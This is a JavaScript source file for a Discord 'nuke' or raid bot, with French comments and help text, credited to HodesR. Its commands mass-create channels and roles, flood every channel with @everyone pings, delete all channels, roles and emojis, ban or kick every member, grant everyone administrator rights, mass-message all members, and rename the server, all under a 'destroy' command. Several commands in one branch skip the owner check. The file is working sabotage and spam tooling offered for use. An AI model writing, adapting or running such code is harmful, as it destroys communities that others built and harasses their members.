// https://github.com/HodesR
// Discord: ! Hodés#1000
// Si tu veux Skid Verifie Bien ou est présent mon pseudo / bio et logo

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;


const destroy = String.raw`

                                        ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗
                                        ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝
                                        ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ 
                                        ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  
                                        ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   
                                        ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   

                                              +-+-+-+ +-+-+ +-+-+-+-+-+-+
                                              |D|e|v| |B|y| |H|o|d|e|s|R|
                                              +-+-+-+ +-+-+ +-+-+-+-+-+-+


`;

console.log(red(destroy));


client.on("ready", () => {
    console.log(red('         =================================================================================='));
    console.log(redBright(`                                      Connecté en tant que: ${client.user.username}#${client.user.discriminator}`));
    console.log(redBright(`                                      Prefix: ${prefix}`));
    console.log(redBright(`                                      PingEveryone: ${disableEveryone}`));
    console.log(redBright(`                                      Permission Obligatoire: ADMINISTRATOR`));
    console.log(red('          =================================================================================='));
    console.log("");
    client.user.setActivity(`Exitium / Imperium`, { type: "STREAMING", url: "https://www.twitch.tv/hodesr" }); // Supp si tu veux 
});




client.on("message", async message => {
 

    if (message.author.bot) return;
        const args = message.content.split(" ").slice(1);
         var raid = args.join(" ");
    if (message.mentions.everyone === true) {
        return;
    } else if (message.mentions.has(client.user.id)) {
        const helpEmbed = new Discord.MessageEmbed()
        .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
        .setTitle('Exitium / Imperium: Destroy')
        .addField(`\`${prefix}cc [text]\``, `**Plein de salons**`)
        .addField(`\`${prefix}mp [text]\``, `**Crée mass salons et Raid avec mass ping**`)
        .addField(`\`${prefix}mr [le nom de tes roles]\``, `**Pleins de roles**`)
        .addField(`\`${prefix}dls\``, `**Supprime tout les salons**`)
        .addField(`\`${prefix}dlr\``, `**Supprime tout les roles**`)
        .addField(`\`${prefix}dle\``, `**Supprime tout les emojis**`)
        .addField(`\`${prefix}banall\``, `**Ban All Members**`)
        .addField(`\`${prefix}kickall\``, `**Kick All Members**`)
        .addField(`\`${prefix}alladm\``, `**Donne les Perms Admin a tout le serveur**`)
        .addField(`\`${prefix}allmp\``, `**Envoie un mp a tout le serveur**`)
        .addField(`\`${prefix}setimg\``, `**Change l'icone du Serveur**`)
        .addField(`\`${prefix}setname\``, `**Change le nom du Serveur**`)
        .addField(`\`${prefix}restart\``, `**Redémarre le bot**`)
        .addField(` \`${prefix}destroy [text]\``,`**Serveur Destroy**`)
        .setThumbnail(`https://cdn.discordapp.com/attachments/862053640649965618/862058725128011796/816004441350078486.png`)
        .setFooter(`© Destructeur | Prefix: ${prefix} | Auteur: HodesR | Cord: ${founder}`)
        .setColor("#FF0000")
            .setTimestamp(Date.now());
        message.author.send(helpEmbed);
    }

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }

    // Help

    if (disableEveryone === false) {

        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
            .setTitle('Exitium / Imperium: Destroy')
            
            .addField(`\`${prefix}cc [text]\``, `**Plein de salons**`)
            .addField(`\`${prefix}mp [text]\``, `**Crée mass salons et Raid avec mass ping**`)
            .addField(`\`${prefix}mr [le nom de tes roles]\``, `**Pleins de roles**`)
            .addField(`\`${prefix}dls\``, `**Supprime tout les salons**`)
            .addField(`\`${prefix}dlr\``, `**Supprime tout les roles**`)
            .addField(`\`${prefix}dle\``, `**Supprime tout les emojis**`)
            .addField(`\`${prefix}banall\``, `**Ban All Members**`)
            .addField(`\`${prefix}kickall\``, `**Kick All Members**`)
            .addField(`\`${prefix}allmp\``, `**Envoie un mp a tout le serveur**`)
            .addField(`\`${prefix}alladm\``, `**Donne les Perms Admin a tout le serveur**`)
            .addField(`\`${prefix}setimg\``, `**Change l'icone du Serveur**`)
            .addField(`\`${prefix}setname\``, `**Change le nom du Serveur**`)
            .addField(`\`${prefix}restart\``, `**Redémarre le bot**`)
            .addField(` \`${prefix}destroy [text]\``,`**Serveur Destroy**`)
            .setThumbnail(`https://cdn.discordapp.com/attachments/862053640649965618/862058725128011796/816004441350078486.png`)
            .setFooter(`© Destructeur | Prefix: ${prefix} | Auteur: HodesR | Cord: ${founder}`)
            .setColor("#FF0000")
                .setTimestamp(Date.now());
            message.author.send(helpEmbed);
            message.delete();
        }

        // Plein de salonss      

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Ajoute un texte aprés la cmd*")
                    } else {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create(argresult)
                            console.log(yellowBright(`CHANNEL MASSED!`))
                        }
                    }
                }
            }
        }

        // Plein de salons & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('Destroy by ' + message.author.username)

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('Destroy by ' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone @here' + argresult)
                                        console.log(blueBright(`Serveur DESTROY`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone @here ' + argresult);
                                console.log(blueBright(`Serveur DESTROY`));
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }


        // Pleins de roles

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Ajoute quelque chose aprés ta commande*")
                } else {
                    setInterval(function () {
                        var i = 0; i < 250;
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).then(console.log(yellow("Role Mass Crée")))
                    }, 100) // 0.1 second
                }
                message.delete();
            }
        }
        

        // Channel Delete
        if (message.content === prefix + "dls")
            if (message.author.id != myID) {
                return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
    
            } else {
          console.info(`salons supprimés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
          message.delete().catch(O_o =>
          {});
          message.guild.channels.cache.forEach((c) =>
          {
            c.delete("Exitium / Imperium").catch(console.error);
          })
        }
        // Ban All
        if (message.content === prefix + "banall")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          console.info('Ban all ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
          message.delete().catch(O_o =>
          {});
          message.guild.members.cache.forEach((m) =>
          {
            m.ban().catch(console.error);
          })
        
        }
        // Kick All
        if (message.content.startsWith(prefix + 'kickall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Entrain de ban tout les membres.")
                        .catch()
                    ));
                message.delete();
            }
        } 
        // Supprime tout les roles                 
        if (message.content.startsWith(prefix + 'dlr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.roles.cache.forEach(r => r.delete({ reason: "Nuking" }).then(console.log(yellow(`ROLE: ${r.name} was deleted successfully`))).catch(
                        console.log(yellow(`ROLE: ${r.name} was cannot be deleted.`))
                    ));
                }
            }
        }

        // Supprime tout les emojis 
        if (message.content === prefix + "dle")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          message.delete().catch(O_o =>
          {})
          if (!message.guild.emojis) return;
          if (!message.guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
          console.info('emotes supprimés sur ' + `${message.guild.name} | ${message.guild.id}`);
          message.guild.emojis.cache.forEach((e) =>
          {
            e.delete("Exitium / Imperium").catch(O_o =>
            {})
          })
        }

        // Death.
        if (message.content.startsWith(prefix + 'destroy')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.delete();
                message.guild.setName(`Exitium / Imperium.`).then(console.log(green(`Nom du Serveur changé en : ${message.guild.name} Destroy`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL NUKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://cdn.discordapp.com/attachments/846084182585507860/846386531933093938/dzdzdzdz.PNG') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} on été delete avec succés`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Ajoute quelque chose aprés ta commande*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                    console.log(blueBright(`Serveur DESTROY`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "RANDOM"
                        }
                    }).then(console.log(yellow("Role Mass Crée")))
                }, 100) // 0.1 second
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (disableEveryone === true) {

        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != myID) {
                return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
            }
            else {
                const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('Exitium / Imperium: Destroy')
                
                .addField(`\`${prefix}cc [text]\``, `**Plein de salons**`)
                .addField(`\`${prefix}mp [text]\``, `**Crée mass salons et Raid avec mass ping**`)
                .addField(`\`${prefix}mr [le nom de tes roles]\``, `**Pleins de roles**`)
                .addField(`\`${prefix}dls\``, `**Supprime tout les salons**`)
                .addField(`\`${prefix}dlr\``, `**Supprime tout les roles**`)
                .addField(`\`${prefix}dle\``, `**Supprime tout les emojis**`)
                .addField(`\`${prefix}banall\``, `**Ban All Members**`)
                .addField(`\`${prefix}kickall\``, `**Kick All Members**`)
                .addField(`\`${prefix}allmp\``, `**Envoie un mp a tout le serveur**`)
                .addField(`\`${prefix}alladm\``, `**Donne les Perms Admin a tout le serveur**`)
                .addField(`\`${prefix}setimg\``, `**Change l'icone du Serveur**`)
                .addField(`\`${prefix}setname\``, `**Change le nom du Serveur**`)
                .addField(`\`${prefix}restart\``, `**Redémarre le bot**`)
                .addField(` \`${prefix}destroy [text]\``,`**Serveur Destroy**`)
                .setThumbnail(`https://cdn.discordapp.com/attachments/862053640649965618/862058725128011796/816004441350078486.png`)
                .setFooter(`© Destructeur | Prefix: ${prefix} | Auteur: HodesR | Cord: ${founder}`)
                .setColor("#FF0000")
                    .setTimestamp(Date.now());
                message.author.send(helpEmbed);
            }

        }

        // Plein de salonss      
        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Ajoute un texte aprés la cmd*")
                    } else {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create(argresult)
                            console.log(yellowBright(`CHANNEL MASSED!`))
                        }
                    }
                }
            }
        }
        if (message.content.startsWith(prefix + "restart"))
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
                  message.delete();
                  client.destroy();
                  client.login(token);
                  client.user.setPresence({
                    activity: {
                      name: `Exitium / Imperium`,
                      type: 3
                    }
                  });
                  message.author.send("Redémarrage terminé!").catch(e => {});
                  console.log("J\'ai redémarré avec succès");
                }

        // Plein de salons & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create('Destroy By ' + message.author.username)

                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('Destroy By ' + message.author.username)

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone  @here ' + argresult)
                                            console.log(blueBright(`Serveur DESTROY`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }

                        }

                    }
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone @here' + argresult);
                                    console.log(blueBright(`Serveur DESTROY`));
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
            }
        }
        if (message.content === prefix + "setimg")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
    message.delete().catch(O_o =>
    {});
    message.guild.setIcon("https://cdn.discordapp.com/attachments/862053640649965618/862058725128011796/816004441350078486.png", "cette pp est mieux");
    console.info(`pp du serveur changé ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
  };
  if (message.content === prefix + "setname")
  if (message.author.id != myID) {
    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

} else {
    console.info('nom du serveur changé ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {});
    message.guild.setName("Exitium / Imperium")
  };
        // Mass Create Roles      

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Ajoute quelque chose aprés ta commande*")
                    } else {
                        setInterval(function () {
                            var i = 0; i < 250;
                            message.guild.roles.create({
                                data: {
                                    name: `${argresult}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).then(console.log(yellow("Role Mass Crée")))
                        }, 100) // 0.1 second
                    }
                }
            }
        }
        // Mp all 

        if (message.content.startsWith(prefix + "allmp"))
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          if (!raid) return message.channel.send("Donne un message.").then(message => message.delete(2000)).catch(console.error);
          message.delete().catch(O_o =>
          {});
          console.info('mp all ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
          message.guild.members.cache.forEach(m =>
          {
            try
            {
              m.send(raid).catch(O_o =>
              {});
            }
            catch (error)
            {
              console.info(`Exitium / Imperium`);
            }
          })
        }

        // Channel Delete
        if (message.content === prefix + "dls")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          console.info(`salons supprimés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`)
          message.delete().catch(O_o =>
          {});
          message.guild.channels.cache.forEach((c) =>
          {
            c.delete("Exitium / Imperium").catch(console.error);
          })
        }

        // Ban All
        if (message.content === prefix + "banall")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          console.info('Ban all ' + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
          message.delete().catch(O_o =>
          {});
          message.guild.members.cache.forEach((m) =>
          {
            m.ban().catch(console.error);
          })
        
        }
        // Admin all
        if (message.content === prefix + "alladm")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
    console.info("Tout le monde est admin sur " + `${message.guild.name} | ${message.guild.id}`);
    message.delete().catch(O_o =>
    {});
    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR'])
  }


        // Kick All
        if (message.content.startsWith(prefix + 'kickall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                if (message.author.id != myID) {
                    return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
                }
                else {
                    message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Entrain de ban tout les membres.")
                            .catch()
                        ));
                }
            }
        }

        // Supprime tout les roles All
        if (message.content === prefix + "dlr")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          console.info(`rôles supprimés ` + 'sur ' + `${message.guild.name} | ${message.guild.id}`);
          message.delete().catch(O_o =>
          {});
          message.guild.roles.cache.forEach((r) =>
          {
            r.delete("Exitium / Imperium ").catch(O_o =>
            {})
          });
        }

        // Supprime tout les emojis All
        if (message.content === prefix + "dle")
        if (message.author.id != myID) {
            return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')

        } else {
          message.delete().catch(O_o =>
          {})
          if (!message.guild.emojis) return;
          if (!message.guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
          console.info('emotes supprimés sur ' + `${message.guild.name} | ${message.guild.id}`);
          message.guild.emojis.cache.forEach((e) =>
          {
            e.delete("Exitium / Imperium").catch(O_o =>
            {})
          })
        }

    // Death.
    if (message.content.startsWith(prefix + 'destroy')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
        } else {
            if (message.author.id != myID) {
                return message.reply('Vous n\'êtes pas autorisé à utiliser l\'une de ces commandes d\'outils.')
            }
            else {
                message.delete();
                message.guild.setName(`Exitium / Imperium.`).then(console.log(green(`Le nom du serveur a été remplacé par : ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL NUKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://cdn.discordapp.com/attachments/846084182585507860/846386531933093938/dzdzdzdz.PNG') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} est en cours de suppression avec succès`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Destroy" },).then(console.log(yellow(`EMOJI: ${e.name} a été supprimé avec succès`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Ajouter une entrée après le cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                    console.log(blueBright(`Serveur DESTROY`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "#FF0000"
                        }
                    }).then(console.log(yellow("Role Mass Crée")))
                }, 100) // 0.1 second
            }
        }
    }

}})

client.login(token)
